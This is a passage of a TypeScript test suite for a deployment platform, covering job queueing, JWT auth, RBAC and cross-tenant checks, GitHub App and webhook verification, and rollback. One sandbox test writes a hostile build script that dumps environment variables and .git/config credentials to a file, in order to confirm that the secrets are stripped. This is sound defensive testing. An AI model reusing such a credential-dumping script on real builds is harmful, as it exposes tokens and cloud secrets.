  console.log('12. Testing DM-903 (Bounded Queue FIFO Concurrency, Timeout Watchdog & Real-Time SSE)...');

  // TC-903-01: Submit 6 concurrent deployments against queue(maxConcurrency=2)
  const batchResponses = await Promise.all(
    Array.from({ length: 6 }, (_, idx) =>
      manager.startDeployment({
        repoUrl: `https://github.com/example/vite-batch-${idx}`,
        target: 'S3_CLOUDFRONT',
        orgId: org1Id,
      })
    )
  );
  assert.strictEqual(batchResponses.every((r) => r.ok), true, 'All 6 burst jobs must be accepted');
  const buildingCount = batchResponses.filter((r) => r.deployment?.status === 'BUILDING').length;
  const queuedCount = batchResponses.filter((r) => r.deployment?.status === 'QUEUED').length;
  assert.strictEqual(buildingCount, 2, 'First 2 jobs must acquire active worker slots (BUILDING)');
  assert.strictEqual(queuedCount, 4, 'Remaining 4 jobs must enter QUEUED state');

  // Wait for all 6 queued/building deployments to drain to LIVE
  for (let i = 0; i < 80; i++) {
    const allLive = batchResponses.every(
      (r) => store.get(r.deployment!.deploymentId)?.status === 'LIVE'
    );
    if (allLive) break;
    await new Promise((r) => setTimeout(r, 150));
  }
  for (const r of batchResponses) {
    assert.strictEqual(
      store.get(r.deployment!.deploymentId)?.status,
      'LIVE',
      `Batch deployment ${r.deployment?.deploymentId} must complete as LIVE`
    );
  }

  // TC-903-02: Timeout Watchdog terminates hung job with BUILD_TIMEOUT & drains next job
  const watchdogQueue = new DeploymentJobQueue({
    maxConcurrency: 1,
    maxQueueBacklog: 10,
    jobTimeoutMs: 120,
  });
  let hungTimedOut = false;
  let secondJobRanAfterTimeout = false;

  watchdogQueue.enqueue({
    payload: {
      deploymentId: 'dep_hung_1',
      cloneUrl: 'https://github.com/example/hung.git',
    },
    onTimeout: () => {
      hungTimedOut = true;
    },
    processor: async () => {
      // Simulate hung build that never resolves within 120ms
      await new Promise((r) => setTimeout(r, 2000));
    },
  });

  watchdogQueue.enqueue({
    payload: {
      deploymentId: 'dep_after_hung_2',
      cloneUrl: 'https://github.com/example/healthy.git',
    },
    processor: async () => {
      secondJobRanAfterTimeout = true;
    },
  });

  await new Promise((r) => setTimeout(r, 260));
  assert.strictEqual(hungTimedOut, true, 'Watchdog must fire onTimeout for hung build');
  assert.strictEqual(
    secondJobRanAfterTimeout,
    true,
    'Worker slot must be released after BUILD_TIMEOUT so queued jobs drain'
  );

  // TC-903-03: Event-driven SSE stream delivers ordered progress events culminating in LIVE
  const sseDeploy = await manager.startDeployment({
    repoUrl: 'https://github.com/example/vite-sse-app',
    target: 'S3_CLOUDFRONT',
  });
  assert.strictEqual(sseDeploy.ok, true);
  const sseStreamRes = await invokeApp(
    testApp,
    'GET',
    `/api/deploy/${sseDeploy.deployment!.deploymentId}/stream`
  );
  assert.strictEqual(sseStreamRes.status, 200);
  assert.ok(String(sseStreamRes.headers['content-type']).includes('text/event-stream'));
  const sseFrames = sseStreamRes.text
    .split('\n\n')
    .map((chunk) => chunk.trim())
    .filter((chunk) => chunk.startsWith('data: '))
    .map((chunk) => JSON.parse(chunk.slice('data: '.length)) as { deployment: { status: string } });
  assert.ok(sseFrames.length >= 2, 'Expected multiple real-time SSE frames across pipeline phases');
  assert.strictEqual(
    sseFrames[sseFrames.length - 1].deployment.status,
    'LIVE',
    'Final SSE frame must reflect LIVE status'
  );
  console.log('   ✓ DM-903 (TC-903-01, TC-903-02, TC-903-03) passed.');

  // ==========================================================================
  // DM-904 (#4): OAuth / JWT Session Auth & .edu Academic Student Detection
  // ==========================================================================
  console.log('13. Testing DM-904 (JWT Validation, Atomic Workspace Onboarding & .edu Student Detection)...');

  // TC-904-03: Academic email verification rules
  assert.strictEqual(detectAcademicStudentEmail('jane@stanford.edu').studentVerified, true);
  assert.strictEqual(detectAcademicStudentEmail('jane@stanford.edu').academicDomain, 'stanford.edu');
  assert.strictEqual(detectAcademicStudentEmail('researcher@ox.ac.uk').studentVerified, true);
  assert.strictEqual(detectAcademicStudentEmail('student@nus.edu.sg').studentVerified, true);
  assert.strictEqual(detectAcademicStudentEmail('founder@startup.io').studentVerified, false);

  // TC-904-01: Missing, malformed, tampered & expired tokens -> 401 Unauthorized
  const missingAuthRes = await invokeApp(testApp, 'GET', '/api/auth/me');
  assert.strictEqual(missingAuthRes.status, 401);

  const tamperedAuthRes = await invokeApp(testApp, 'GET', '/api/auth/me', {
    headers: { Authorization: 'Bearer eyJhbGciOiJIUzI1NiJ9.tampered.signature' },
  });
  assert.strictEqual(tamperedAuthRes.status, 401);

  const expiredToken = authService.signToken(
    {
      sub: sessionOrg1.user.userId,
      email: sessionOrg1.user.email,
      defaultOrgId: org1Id,
    },
    -10
  );
  const expiredAuthRes = await invokeApp(testApp, 'GET', '/api/auth/me', {
    headers: { Authorization: `Bearer ${expiredToken}` },
  });
  assert.strictEqual(expiredAuthRes.status, 401);

  // TC-904-02: First-time OAuth session onboarding via POST /api/auth/session
  const studentLoginRes = await invokeApp(testApp, 'POST', '/api/auth/session', {
    body: {
      email: 'jane@stanford.edu',
      displayName: 'Jane Stanford',
      authProvider: 'github',
    },
  });
  assert.strictEqual(studentLoginRes.status, 200);
  assert.ok(
    String(studentLoginRes.headers['set-cookie'] || '').includes('HttpOnly'),
    'Session cookie must set HttpOnly flag'
  );
  const studentSession = studentLoginRes.json<{
    token: string;
    user: { userId: string; studentVerified: boolean; academicDomain: string };
    defaultOrganization: { orgId: string; planTier: string };
    organizations: Array<{ role: string }>;
  }>();
  assert.strictEqual(studentSession.user.studentVerified, true);
  assert.strictEqual(studentSession.user.academicDomain, 'stanford.edu');
  assert.strictEqual(studentSession.defaultOrganization.planTier, 'CAMPUS_FREE');
  assert.strictEqual(studentSession.organizations[0].role, 'OWNER');

  const meRes = await invokeApp(testApp, 'GET', '/api/auth/me', {
    headers: { Authorization: `Bearer ${studentSession.token}` },
  });
  assert.strictEqual(meRes.status, 200);
  console.log('   ✓ DM-904 (TC-904-01, TC-904-02, TC-904-03) passed.');

  // ==========================================================================
  // DM-905 (#5): Organizations, Projects & RBAC + Cross-Tenant IDOR Security
  // ==========================================================================
  console.log('14. Testing DM-905 (OWNER/ADMIN/DEVELOPER/VIEWER RBAC Matrix & Cross-Tenant IDOR 404)...');

  // 1. OWNER creates Team Org A
  const createOrgARes = await invokeApp(testApp, 'POST', '/api/orgs', {
    headers: { Authorization: `Bearer ${studentSession.token}` },
    body: { name: 'Stanford Robotics Cloud', planTier: 'GROWTH_TEAM' },
  });
  assert.strictEqual(createOrgARes.status, 201);
  const orgAId = createOrgARes.json<{ organization: { orgId: string } }>().organization.orgId;

  // 2. Invite ADMIN, DEVELOPER, and VIEWER into Org A
  for (const member of [
    { email: 'admin@robotics.io', role: 'ADMIN' },
    { email: 'dev@robotics.io', role: 'DEVELOPER' },
    { email: 'viewer@robotics.io', role: 'VIEWER' },
  ]) {
    const invRes = await invokeApp(testApp, 'POST', `/api/orgs/${orgAId}/members`, {
      headers: { Authorization: `Bearer ${studentSession.token}` },
      body: member,
    });
    assert.strictEqual(invRes.status, 201);
  }

  // Obtain JWTs for ADMIN, DEVELOPER, VIEWER, and an external attacker in Org B
  const adminToken = (
    await invokeApp(testApp, 'POST', '/api/auth/session', {
      body: { email: 'admin@robotics.io' },
    })
  ).json<{ token: string }>().token;

  const devToken = (
    await invokeApp(testApp, 'POST', '/api/auth/session', {
      body: { email: 'dev@robotics.io' },
    })
  ).json<{ token: string }>().token;

  const viewerToken = (
    await invokeApp(testApp, 'POST', '/api/auth/session', {
      body: { email: 'viewer@robotics.io' },
    })
  ).json<{ token: string }>().token;

  const orgBSession = (
    await invokeApp(testApp, 'POST', '/api/auth/session', {
      body: { email: 'outsider@othercompany.com' },
    })
  ).json<{ token: string; defaultOrganization: { orgId: string } }>();

  // TC-905-01a: VIEWER cannot create projects or deploy (403), but CAN read deployments (200)
  const viewerCreateProj = await invokeApp(testApp, 'POST', `/api/orgs/${orgAId}/projects`, {
    headers: { Authorization: `Bearer ${viewerToken}`, 'X-Org-Id': orgAId },
    body: { name: 'viewer-blocked', repoUrl: 'https://github.com/example/vite-app' },
  });
  assert.strictEqual(viewerCreateProj.status, 403);

  const viewerDeploy = await invokeApp(testApp, 'POST', '/api/deploy', {
    headers: { Authorization: `Bearer ${viewerToken}`, 'X-Org-Id': orgAId },
    body: { repoUrl: 'https://github.com/example/vite-app', environment: 'preview' },
  });
  assert.strictEqual(viewerDeploy.status, 403);

  const viewerList = await invokeApp(testApp, 'GET', '/api/deployments', {
    headers: { Authorization: `Bearer ${viewerToken}`, 'X-Org-Id': orgAId },
  });
  assert.strictEqual(viewerList.status, 200);

  // TC-905-01b: DEVELOPER CAN create project (201) & deploy to preview (202), CANNOT invite members (403) or deploy to production (403)
  const devInviteBlocked = await invokeApp(testApp, 'POST', `/api/orgs/${orgAId}/members`, {
    headers: { Authorization: `Bearer ${devToken}`, 'X-Org-Id': orgAId },
    body: { email: 'friend@robotics.io', role: 'VIEWER' },
  });
  assert.strictEqual(devInviteBlocked.status, 403);

  const devCreateProj = await invokeApp(testApp, 'POST', `/api/orgs/${orgAId}/projects`, {
    headers: { Authorization: `Bearer ${devToken}`, 'X-Org-Id': orgAId },
    body: { name: 'Telemetry UI', repoUrl: 'https://github.com/example/vite-app' },
  });
  assert.strictEqual(devCreateProj.status, 201);
  const projectAId = devCreateProj.json<{ project: { projectId: string } }>().project.projectId;

  const devPreviewDeploy = await invokeApp(testApp, 'POST', '/api/deploy', {
    headers: { Authorization: `Bearer ${devToken}`, 'X-Org-Id': orgAId },
    body: {
      repoUrl: 'https://github.com/example/vite-app',
      projectId: projectAId,
      environment: 'preview',
    },
  });
  assert.strictEqual(devPreviewDeploy.status, 202, 'DEVELOPER must be allowed to deploy preview');

  const devProdBlocked = await invokeApp(testApp, 'POST', '/api/deploy', {
    headers: { Authorization: `Bearer ${devToken}`, 'X-Org-Id': orgAId },
    body: {
      repoUrl: 'https://github.com/example/vite-app',
      projectId: projectAId,
      environment: 'production',
    },
  });
  assert.strictEqual(devProdBlocked.status, 403, 'DEVELOPER must be blocked from production deploy');

  // TC-905-01c: ADMIN CAN deploy to production (202), while DEVELOPER & VIEWER CANNOT delete production (403)
  const adminProdDeploy = await invokeApp(testApp, 'POST', '/api/deploy', {
    headers: { Authorization: `Bearer ${adminToken}`, 'X-Org-Id': orgAId },
    body: {
      repoUrl: 'https://github.com/example/vite-app',
      projectId: projectAId,
      environment: 'production',
    },
  });
  assert.strictEqual(adminProdDeploy.status, 202, 'ADMIN must be allowed to deploy production');
  const prodDepId = adminProdDeploy.json<{ deploymentId: string }>().deploymentId;

  for (let i = 0; i < 40; i++) {
    if (store.get(prodDepId)?.status === 'LIVE') break;
    await new Promise((r) => setTimeout(r, 150));
  }

  const devDeleteProdBlocked = await invokeApp(
    testApp,
    'DELETE',
    `/api/deploy/${prodDepId}`,
    {
      headers: { Authorization: `Bearer ${devToken}`, 'X-Org-Id': orgAId },
    }
  );
  assert.strictEqual(devDeleteProdBlocked.status, 403, 'DEVELOPER cannot teardown production');

  // TC-905-02: Cross-Tenant IDOR Security Test -> Outsider in Org B gets 404 Not Found on Org A resources
  const idorGetDeploy = await invokeApp(testApp, 'GET', `/api/deploy/${prodDepId}`, {
    headers: {
      Authorization: `Bearer ${orgBSession.token}`,
      'X-Org-Id': orgBSession.defaultOrganization.orgId,
    },
  });
  assert.strictEqual(idorGetDeploy.status, 404, 'Cross-tenant GET /api/deploy/:id must return 404');

  const idorDeleteDeploy = await invokeApp(testApp, 'DELETE', `/api/deploy/${prodDepId}`, {
    headers: {
      Authorization: `Bearer ${orgBSession.token}`,
      'X-Org-Id': orgBSession.defaultOrganization.orgId,
    },
  });
  assert.strictEqual(
    idorDeleteDeploy.status,
    404,
    'Cross-tenant DELETE /api/deploy/:id must return 404 without ID enumeration'
  );

  const idorGetOrg = await invokeApp(testApp, 'GET', `/api/orgs/${orgAId}`, {
    headers: { Authorization: `Bearer ${orgBSession.token}` },
  });
  assert.strictEqual(idorGetOrg.status, 404, 'Cross-tenant GET /api/orgs/:orgId must return 404');

  // Finally, ADMIN tears down Org A production deployment cleanly (200)
  const adminDeleteProd = await invokeApp(testApp, 'DELETE', `/api/deploy/${prodDepId}`, {
    headers: { Authorization: `Bearer ${adminToken}`, 'X-Org-Id': orgAId },
  });
  assert.strictEqual(adminDeleteProd.status, 200);

  if (fs.existsSync(tmpDbPath)) {
    fs.unlinkSync(tmpDbPath);
  }

  console.log('   ✓ DM-905 (TC-905-01 RBAC Matrix & TC-905-02 Cross-Tenant IDOR 404) passed.\n');
  console.log('ALL PHASE 9 · SPRINT 1 TESTS (DM-901, DM-902, DM-903, DM-904, DM-905) PASSED!\n');
}

async function runPhase9Sprint2Tests(): Promise<void> {
  console.log('=== DeployMate Phase 9 · Sprint 2 Verification Suite (DM-906, DM-907, DM-908, DM-913) ===\n');

  const tmpDbPath = path.join(os.tmpdir(), `deploymate-phase9-sprint2-${Date.now()}.json`);
  const store = new DeploymentStore(tmpDbPath);
  const queue = new DeploymentJobQueue({
    maxConcurrency: 3,
    maxQueueBacklog: 30,
    jobTimeoutMs: 15_000,
  });
  const manager = new DeploymentManager(store, queue);
  const testApp = createApp(store, manager, queue);

  const waitUntilSettled = async (deploymentId: string) => {
    for (let i = 0; i < 60; i++) {
      const cur = store.get(deploymentId);
      if (cur && (cur.status === 'LIVE' || cur.status === 'FAILED' || cur.status === 'DELETED')) {
        return cur;
      }
      await new Promise((r) => setTimeout(r, 120));
    }
    throw new Error(`Deployment ${deploymentId} did not settle within timeout.`);
  };

  // Onboard Org A (OWNER + ADMIN + DEVELOPER) and Org B (external tenant)
  const ownerRes = await invokeApp(testApp, 'POST', '/api/auth/session', {
    body: { email: 'owner@acme-cloud.io', displayName: 'Acme Owner', authProvider: 'github' },
  });
  assert.strictEqual(ownerRes.status, 200);
  const ownerSession = ownerRes.json<{
    token: string;
    defaultOrganization: { orgId: string };
  }>();
  const orgAId = ownerSession.defaultOrganization.orgId;

  await invokeApp(testApp, 'POST', `/api/orgs/${orgAId}/members`, {
    headers: { Authorization: `Bearer ${ownerSession.token}` },
    body: { email: 'admin@acme-cloud.io', role: 'ADMIN' },
  });
  await invokeApp(testApp, 'POST', `/api/orgs/${orgAId}/members`, {
    headers: { Authorization: `Bearer ${ownerSession.token}` },
    body: { email: 'dev@acme-cloud.io', role: 'DEVELOPER' },
  });

  const adminToken = (
    await invokeApp(testApp, 'POST', '/api/auth/session', {
      body: { email: 'admin@acme-cloud.io' },
    })
  ).json<{ token: string }>().token;

  const devToken = (
    await invokeApp(testApp, 'POST', '/api/auth/session', {
      body: { email: 'dev@acme-cloud.io' },
    })
  ).json<{ token: string }>().token;

  const orgBSession = (
    await invokeApp(testApp, 'POST', '/api/auth/session', {
      body: { email: 'attacker@other-org.io' },
    })
  ).json<{ token: string; defaultOrganization: { orgId: string } }>();

  // ==========================================================================
  // DM-906 (#6): Private GitHub App Installation Tokens & Exfiltration Defense
  // ==========================================================================
  console.log('15. Testing DM-906 (RS256 GitHub App JWT, Paginated Repo Picker & Zero-Exfiltration Build Sandbox)...');

  // Verify RS256 GitHub App JWT cryptographic signing
  const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
    modulusLength: 2048,
  });
  const privatePem = privateKey.export({ type: 'pkcs1', format: 'pem' }).toString();
  const publicPem = publicKey.export({ type: 'pkcs1', format: 'pem' }).toString();
  const appJwt = githubAppService.signAppJwt('987654', privatePem);
  const [jwtH, jwtP, jwtS] = appJwt.split('.');
  const verifier = crypto.createVerify('RSA-SHA256');
  verifier.update(`${jwtH}.${jwtP}`);
  verifier.end();
  const sigBuf = Buffer.from(jwtS.replace(/-/g, '+').replace(/_/g, '/'), 'base64');
  assert.strictEqual(verifier.verify(publicPem, sigBuf), true, 'RS256 GitHub App JWT signature must verify');

  // TC-906-02: Connect GitHub App installation (DEVELOPER blocked 403, ADMIN allowed 201) & list paginated repos
  const devConnectBlocked = await invokeApp(testApp, 'POST', '/api/github/installations', {
    headers: { Authorization: `Bearer ${devToken}`, 'X-Org-Id': orgAId },
    body: { accountLogin: 'acme-cloud' },
  });
  assert.strictEqual(devConnectBlocked.status, 403);

  const connectInstRes = await invokeApp(testApp, 'POST', '/api/github/installations', {
    headers: { Authorization: `Bearer ${adminToken}`, 'X-Org-Id': orgAId },
    body: {
      accountLogin: 'acme-cloud',
      accountType: 'Organization',
      repositories: [
        { name: 'commercial-saas-web', private: true, defaultBranch: 'main', branches: ['main', 'staging', 'feat/pr-42'] },
        { name: 'payments-worker', private: true, defaultBranch: 'main', branches: ['main'] },
        { name: 'docs-portal', private: false, defaultBranch: 'main', branches: ['main'] },
      ],
    },
  });
  assert.strictEqual(connectInstRes.status, 201);

  const page1Res = await invokeApp(testApp, 'GET', '/api/github/repos?page=1&perPage=2', {
    headers: { Authorization: `Bearer ${devToken}`, 'X-Org-Id': orgAId },
  });
  assert.strictEqual(page1Res.status, 200);
  const page1Data = page1Res.json<{
    repositories: Array<{ fullName: string; private: boolean; branches: string[] }>;
    totalCount: number;
    totalPages: number;
  }>();
  assert.strictEqual(page1Data.repositories.length, 2);
  assert.strictEqual(page1Data.totalCount, 3);
  assert.strictEqual(page1Data.totalPages, 2);
  assert.strictEqual(page1Data.repositories[0].fullName, 'acme-cloud/commercial-saas-web');
  assert.strictEqual(page1Data.repositories[0].private, true);
  assert.ok(page1Data.repositories[0].branches.includes('feat/pr-42'));

  // Cross-org check: Org B sees 0 repositories from Org A's GitHub App installation
  const orgBReposRes = await invokeApp(testApp, 'GET', '/api/github/repos', {
    headers: {
      Authorization: `Bearer ${orgBSession.token}`,
      'X-Org-Id': orgBSession.defaultOrganization.orgId,
    },
  });
  assert.strictEqual(orgBReposRes.json<{ totalCount: number }>().totalCount, 0);

  // TC-906-01: Security Exfiltration Test — malicious build script dumping process.env and .git/config
  const exfilWorkspace = path.join(os.tmpdir(), `dm-exfil-test-${Date.now()}`);
  const exfilRepoDir = path.join(exfilWorkspace, 'repo');
  fs.mkdirSync(path.join(exfilRepoDir, '.git'), { recursive: true });

  const sensitiveInstallToken = 'dm_test_install_tok_999888777';
  const sensitiveAwsSecret = 'dm_test_aws_host_secret_555';
  fs.writeFileSync(
    path.join(exfilRepoDir, '.git', 'config'),
    `[core]\n\trepositoryformatversion = 0\n[remote "origin"]\n\turl = https://x-access-token:${sensitiveInstallToken}@github.com/acme-cloud/commercial-saas-web.git\n\textraheader = AUTHORIZATION: bearer ${sensitiveInstallToken}\n`,
    'utf8'
  );
  fs.writeFileSync(
    path.join(exfilRepoDir, 'package.json'),
    JSON.stringify({
      name: 'exfil-probe',
      version: '1.0.0',
      scripts: { build: 'node dump-leak.js' },
    }),
    'utf8'
  );
  fs.writeFileSync(
    path.join(exfilRepoDir, 'dump-leak.js'),
    `const fs = require('fs');
const path = require('path');
fs.mkdirSync(path.join(__dirname, 'dist'), { recursive: true });
const gitCfg = fs.existsSync(path.join(__dirname, '.git/config'))
  ? fs.readFileSync(path.join(__dirname, '.git/config'), 'utf8')
  : '';
const dump = JSON.stringify({ env: process.env, gitConfig: gitCfg }, null, 2);
fs.writeFileSync(path.join(__dirname, 'dist/leak.txt'), dump, 'utf8');
fs.writeFileSync(path.join(__dirname, 'dist/index.html'), '<h1>Built</h1>', 'utf8');
`,
    'utf8'
  );

  const prevAwsSecret = process.env.AWS_SECRET_ACCESS_KEY;
  process.env.AWS_SECRET_ACCESS_KEY = sensitiveAwsSecret;
  try {
    const exfilAnalysis = new RepositoryAnalyzer().analyzeDirectory(exfilRepoDir);
    exfilAnalysis.buildCommand = 'npm run build';
    exfilAnalysis.outputDirectory = 'dist';

    const buildOut = await isolatedBuildRunner.runIsolatedBuild({
      deploymentId: 'dep_exfil906',
      workspaceDir: exfilWorkspace,
      repoDir: exfilRepoDir,
      clonedFromRemote: true,
      repoUrl: 'https://github.com/acme-cloud/commercial-saas-web',
      analysis: exfilAnalysis,
      userEnvVars: {
        PUBLIC_APP_NAME: 'AcmeCommercial',
        GITHUB_TOKEN: sensitiveInstallToken, // even if someone tried injecting GITHUB_*, worker strips it
      },
      dryRun: false,
    });

    assert.ok(buildOut.generatedFiles.includes('leak.txt'), 'Untrusted build script must have run');
    const leakDump = fs.readFileSync(path.join(exfilRepoDir, 'dist', 'leak.txt'), 'utf8');
    assert.strictEqual(
      leakDump.includes(sensitiveInstallToken),
      false,
      'TC-906-01 FAILED: GitHub installation token leaked into build environment or .git/config!'
    );
    assert.strictEqual(
      leakDump.includes(sensitiveAwsSecret),
      false,
      'TC-906-01 FAILED: Host AWS_SECRET_ACCESS_KEY leaked into build worker!'
    );
    assert.ok(
      leakDump.includes('AcmeCommercial'),
      'Expected whitelisted non-cloud user env var to be available during build'
    );
  } finally {
    if (prevAwsSecret === undefined) delete process.env.AWS_SECRET_ACCESS_KEY;
    else process.env.AWS_SECRET_ACCESS_KEY = prevAwsSecret;
    fs.rmSync(exfilWorkspace, { recursive: true, force: true });
  }
  console.log('   ✓ DM-906 (TC-906-01 Zero-Exfiltration Sandbox & TC-906-02 Paginated Private Repos) passed.');

  // ==========================================================================
  // DM-907 (#7): HMAC GitHub Push Webhooks, Replay Deduplication & Instant Rollback
  // ==========================================================================
  console.log('16. Testing DM-907 (HMAC-SHA256 Push Webhooks, Replay Protection & <10s Instant Rollback)...');

  // Create project in Org A linked to acme-cloud/commercial-saas-web
  const createProjRes = await invokeApp(testApp, 'POST', `/api/orgs/${orgAId}/projects`, {
    headers: { Authorization: `Bearer ${adminToken}`, 'X-Org-Id': orgAId },
    body: {
      name: 'Commercial SaaS Web',
      slug: 'commercial-saas-web',
      repoUrl: 'https://github.com/acme-cloud/commercial-saas-web',
      defaultBranch: 'main',
    },
  });
  assert.strictEqual(createProjRes.status, 201);
  const saasProjectId = createProjRes.json<{ project: { projectId: string } }>().project.projectId;

  const pushPayloadV1 = {
    ref: 'refs/heads/main',
    after: 'a1b2c3d4e5f60001a1b2c3d4e5f60001a1b2c3d4',
    repository: {
      full_name: 'acme-cloud/commercial-saas-web',
      html_url: 'https://github.com/acme-cloud/commercial-saas-web',
      default_branch: 'main',
    },
    head_commit: {
      id: 'a1b2c3d4e5f60001a1b2c3d4e5f60001a1b2c3d4',
      message: 'feat: launch v1 billing',
      author: { username: 'jane-dev' },
    },
  };
  const rawPushV1 = JSON.stringify(pushPayloadV1);
  const validSigV1 = computeGitHubWebhookSignature(rawPushV1);

  // TC-907-01a: Missing signature -> 401
  const missingSigRes = await invokeApp(testApp, 'POST', '/api/webhooks/github', {
    rawBody: rawPushV1,
    headers: { 'X-GitHub-Event': 'push' },
  });
  assert.strictEqual(missingSigRes.status, 401);

  // TC-907-01b: Tampered raw body with original signature -> 401
  const tamperedRaw = rawPushV1.replace('feat: launch v1 billing', 'feat: evil tampered commit');
  const tamperedSigRes = await invokeApp(testApp, 'POST', '/api/webhooks/github', {
    rawBody: tamperedRaw,
    headers: {
      'X-GitHub-Event': 'push',
      'X-Hub-Signature-256': validSigV1,
    },
  });
  assert.strictEqual(tamperedSigRes.status, 401);

  // TC-907-01c: Valid HMAC signature triggers automatic production deployment (v1)
  const validPushV1Res = await invokeApp(testApp, 'POST', '/api/webhooks/github', {
    rawBody: rawPushV1,
    headers: {
      'X-GitHub-Event': 'push',
      'X-GitHub-Delivery': 'delivery-v1-001',
      'X-Hub-Signature-256': validSigV1,
    },
  });
  assert.strictEqual(validPushV1Res.status, 202);
  const v1Body = validPushV1Res.json<{
    deploymentId: string;
    environment: string;
    githubCheckStatus: string;
  }>();
  assert.strictEqual(v1Body.environment, 'production');
  assert.strictEqual(v1Body.githubCheckStatus, 'pending');

  // TC-907-01d: Replay identical X-GitHub-Delivery ID -> idempotent 200 deduplicated skip
  const replayPushRes = await invokeApp(testApp, 'POST', '/api/webhooks/github', {
    rawBody: rawPushV1,
    headers: {
      'X-GitHub-Event': 'push',
      'X-GitHub-Delivery': 'delivery-v1-001',
      'X-Hub-Signature-256': validSigV1,
    },
  });
  assert.strictEqual(replayPushRes.status, 200);
  assert.strictEqual(replayPushRes.json<{ deduplicated: boolean }>().deduplicated, true);

  const settledV1 = await waitUntilSettled(v1Body.deploymentId);
  assert.strictEqual(settledV1.status, 'LIVE');
  assert.strictEqual(settledV1.githubCheckStatus, 'success');
  assert.strictEqual(settledV1.isProductionActive, true);
  assert.ok(settledV1.artifactUri, 'Expected immutable artifactUri on LIVE deployment');
  assert.strictEqual(store.getProject(saasProjectId)?.activeProductionDeploymentId, v1Body.deploymentId);

  // Deploy v2 via GitHub push so we can test 1-click Instant Rollback from v2 -> v1
  const pushPayloadV2 = {
    ...pushPayloadV1,
    after: 'b2c3d4e5f6a70002b2c3d4e5f6a70002b2c3d4e5',
    head_commit: {
      id: 'b2c3d4e5f6a70002b2c3d4e5f6a70002b2c3d4e5',
      message: 'feat: v2 UI update',
      author: { username: 'jane-dev' },
    },
  };
  const rawPushV2 = JSON.stringify(pushPayloadV2);
  const validPushV2Res = await invokeApp(testApp, 'POST', '/api/webhooks/github', {
    rawBody: rawPushV2,
    headers: {
      'X-GitHub-Event': 'push',
      'X-GitHub-Delivery': 'delivery-v2-002',
      'X-Hub-Signature-256': computeGitHubWebhookSignature(rawPushV2),
    },
  });
  assert.strictEqual(validPushV2Res.status, 202);
  const v2DepId = validPushV2Res.json<{ deploymentId: string }>().deploymentId;
  await waitUntilSettled(v2DepId);

  assert.strictEqual(store.getProject(saasProjectId)?.activeProductionDeploymentId, v2DepId);
  assert.strictEqual(store.get(v1Body.deploymentId)?.isProductionActive, false);
  assert.strictEqual(store.get(v2DepId)?.isProductionActive, true);

  // TC-907-02: DEVELOPER blocked (403), Cross-Org blocked (404), ADMIN Instant Rollback succeeds in <50ms!
  const devRollbackBlocked = await invokeApp(
    testApp,
    'POST',
    `/api/projects/${saasProjectId}/rollback/${v1Body.deploymentId}`,
    {
      headers: { Authorization: `Bearer ${devToken}`, 'X-Org-Id': orgAId },
    }
  );
  assert.strictEqual(devRollbackBlocked.status, 403);

  const idorRollbackBlocked = await invokeApp(
    testApp,
    'POST',
    `/api/projects/${saasProjectId}/rollback/${v1Body.deploymentId}`,
    {
      headers: {
        Authorization: `Bearer ${orgBSession.token}`,
        'X-Org-Id': orgBSession.defaultOrganization.orgId,
      },
    }
  );
  assert.strictEqual(idorRollbackBlocked.status, 404);

  const rollbackStart = Date.now();
  const adminRollbackRes = await invokeApp(
    testApp,
    'POST',
    `/api/projects/${saasProjectId}/rollback/${v1Body.deploymentId}`,
    {
      headers: { Authorization: `Bearer ${adminToken}`, 'X-Org-Id': orgAId },
    }
  );
  const rollbackElapsedMs = Date.now() - rollbackStart;
  assert.strictEqual(adminRollbackRes.status, 200);
  assert.ok(rollbackElapsedMs < 1_000, `Instant rollback must complete in <10s (took ${rollbackElapsedMs}ms)`);
  assert.strictEqual(
    store.getProject(saasProjectId)?.activeProductionDeploymentId,
    v1Body.deploymentId
  );
  assert.strictEqual(store.get(v1Body.deploymentId)?.isProductionActive, true);
  assert.strictEqual(store.get(v1Body.deploymentId)?.rolledBackFromDeploymentId, v2DepId);
  assert.strictEqual(store.get(v2DepId)?.isProductionActive, false);
  console.log(`   ✓ DM-907 (TC-907-01 Webhook HMAC/Replay & TC-907-02 Instant Rollback in ${rollbackElapsedMs}ms) passed.`);

  // ==========================================================================
  // DM-908 (#8): Ephemeral Pull Request Previews, Single Upsert Comment & Auto-Destroy
  // ==========================================================================
  console.log('17. Testing DM-908 (Ephemeral PR #42 Preview URL, Single Upsert PR Bot Comment & Merge Teardown)...');

  const prOpenedPayload = {
    action: 'opened',
    number: 42,
    repository: {
      full_name: 'acme-cloud/commercial-saas-web',
      html_url: 'https://github.com/acme-cloud/commercial-saas-web',
    },
    pull_request: {
      number: 42,
      title: 'feat: add interactive pricing table',
      user: { login: 'alex-contributor' },
      head: { ref: 'feat/pr-42', sha: '1111111aaaa2222bbbb' },
    },
  };
  const rawPrOpened = JSON.stringify(prOpenedPayload);
  const prOpenRes = await invokeApp(testApp, 'POST', '/api/webhooks/github', {
    rawBody: rawPrOpened,
    headers: {
      'X-GitHub-Event': 'pull_request',
      'X-GitHub-Delivery': 'delivery-pr42-open',
      'X-Hub-Signature-256': computeGitHubWebhookSignature(rawPrOpened),
    },
  });
  assert.strictEqual(prOpenRes.status, 202);
  const prOpenData = prOpenRes.json<{
    deploymentId: string;
    customHostname: string;
    inPlaceUpdate: boolean;
    prCommentId: string;
  }>();
  assert.strictEqual(prOpenData.inPlaceUpdate, false);
  assert.strictEqual(prOpenData.customHostname, 'pr-42-commercial-saas-web.maas-fam.com');

  const settledPrOpen = await waitUntilSettled(prOpenData.deploymentId);
  assert.strictEqual(settledPrOpen.status, 'LIVE');
  assert.strictEqual(settledPrOpen.url, 'https://pr-42-commercial-saas-web.maas-fam.com');

  const prCommentAfterOpen = (
    await invokeApp(testApp, 'GET', '/api/webhooks/pr-comments/acme-cloud/commercial-saas-web/42')
  ).json<{ comment: { commentId: string; status: string; previewUrl: string; markdownBody: string } }>().comment;
  assert.strictEqual(prCommentAfterOpen.status, 'LIVE');
  assert.strictEqual(prCommentAfterOpen.previewUrl, 'https://pr-42-commercial-saas-web.maas-fam.com');
  assert.ok(prCommentAfterOpen.markdownBody.includes('1111111'));

  // Push new commit to PR #42 (synchronize) -> must update IN-PLACE and edit SAME PR comment ID
  const prSyncPayload = {
    ...prOpenedPayload,
    action: 'synchronize',
    pull_request: {
      ...prOpenedPayload.pull_request,
      head: { ref: 'feat/pr-42', sha: '2222222cccc3333dddd' },
    },
  };
  const rawPrSync = JSON.stringify(prSyncPayload);
  const prSyncRes = await invokeApp(testApp, 'POST', '/api/webhooks/github', {
    rawBody: rawPrSync,
    headers: {
